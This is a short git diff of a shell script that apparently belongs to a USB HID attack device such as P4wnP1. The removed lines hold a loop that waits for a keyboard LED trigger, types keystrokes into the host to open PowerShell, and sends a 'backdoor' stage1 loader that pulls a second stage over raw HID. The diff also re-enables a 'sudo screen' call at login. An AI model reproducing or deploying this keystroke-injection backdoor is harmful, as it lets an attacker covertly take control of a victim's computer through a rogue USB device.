@@ -37,30 +37,6 @@ function onKeyboardUp()
 
 	# blink two times when hid keyboard is usable and HID server is started
 	led_blink 2
-
-	while $true; do
-		# wait for keyboard LED trigger
-		key_trigger
-	
-		# run interactive PowerShell console
-		cat <<- EOF | duckhid
-			GUI r
-			DELAY 500
-			STRING powershell.exe
-			ENTER
-			DELAY 1000
-EOF
-
-		# write stub
-		VID=$(echo $USB_VID | cut -dx -f2)
-		PID=$(echo $USB_PID | cut -dx -f2)
-		(
-			echo \$USB_PID=\"$PID\"\;\$USB_VID=\"$VID\"\;
-		) | outhid
-
-		# output stage1 command (loads stage2 via raw HID)
-		cat $wdir/hidtools/backdoor/stage1_mini.ps1 | outhid
-	done
 }
 
 
@@ -68,6 +44,6 @@ EOF
 # the commans are ran by user "pi"
 function onLogin()
 {
-	#sudo screen -d -r
+	sudo screen -d -r
 	return
 }
